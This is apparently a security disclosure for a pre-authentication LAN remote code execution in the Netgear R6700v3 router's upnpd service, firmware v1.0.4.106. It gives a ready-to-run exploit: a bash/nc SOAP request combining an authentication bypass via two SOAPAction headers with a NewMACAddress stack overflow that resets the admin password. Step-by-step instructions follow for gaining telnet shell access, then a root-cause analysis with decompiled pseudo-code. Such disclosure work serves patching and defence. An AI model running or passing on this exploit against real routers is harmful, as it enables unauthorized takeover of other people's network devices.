# Pre-auth LAN RCE in Netgear R6700v3 v1.0.4.106

Disclosed is a pre-auth LAN RCE based on a stack overflow in the router from Netgear, model AC1750 R6700v3. This targets the firmware v1.0.4.106 and the vulnerable target binary is upnpd. This particular exploit against the vulnerability will not work against newer firmware versions.

## Details

The vulnerability is in the handling of requests to upnp, specifically a SOAPAction for setting a MAC address. This SOAPAction requires usually authentication, but as shown previously [1] the authentication can be bypassed by adding two SOAPActions `urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin` and `SOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#SetDeviceInfoByMAC` in order to bypass the authentication logic.

A long string provided in the `NewMACAddress` tag causes the buffer overflow. Details for this can be found below in the root cause analysis.

The following request, performs similar to [1] a password reset using a single gadget by jumping to the procedure `acosNvramConfig_set`, which is located at `0x39b30` in v1.0.4.106. The input password to acosNvramConfig_set will be `password.

```
BODY='<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<NewMACAddress>'"$(printf 'a%.0s' {0..1016})"'\x30\x9b\x03</NewMACAddress>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>'
BODY_LEN=$(echo -n ${BODY} | wc -c )
echo -ne "POST soap/server_sa HTTP/1.0\r\nHost: 192.168.1.1:5000\r\nContent-Type: application/x-www-form-urlencoded\r\nSOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\r\nSOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#SetDeviceInfoByMAC\r\nContent-Length: ${BODY_LEN}\r\n\r\n${BODY}" | nc -i 1 192.168.1.1 5000
```

Next login to the web interface with the user admin and password `password`. Change the password, and run the well-known telnetenable tool [2] in order to open the telnet port and login to the router for shell access.

Summary:

1) Run the request with the exploit payload to reset the password
2) Login to the web interface with user admin and password `password
3) Run telnetenable to gain shell access: ./telnetenable <router_ip> <router_lan_port_mac> admin <new_password>

## Root cause analysis
The root cause exists in the function at address 0x3b8f8 in v1.0.4.106. The relevant pseudo-code is:
```
   ..
   .
   v61 = stristr(v13, "NewMACAddress");
    if ( v61 )
    {
      v62 = (const char *)(stristr(v13, "NewMACAddress xsi:type=\"xsd:string\">") ? v61 + 36 : v61 + 14);
      strncpy(byte_DB00C, "", 0x13u);
      v63 = stristr(v13, "</NewMACAddress>");
      if ( v63 )
      {
        v64 = v63 - (_DWORD)v62;
        strncpy(byte_DB00C, "", 0x13u);
        strncpy(byte_DB00C, v62, v64);
        byte_DB00C[v64] = 0;
        sub_C310(3, "NewMACAddress = %s\n", byte_DB00C);
      }
    }
    .
    ..
```
which performs a copy to a memory location without any size limitations in `strncpy(byte_DB00C, v62, v64)`.
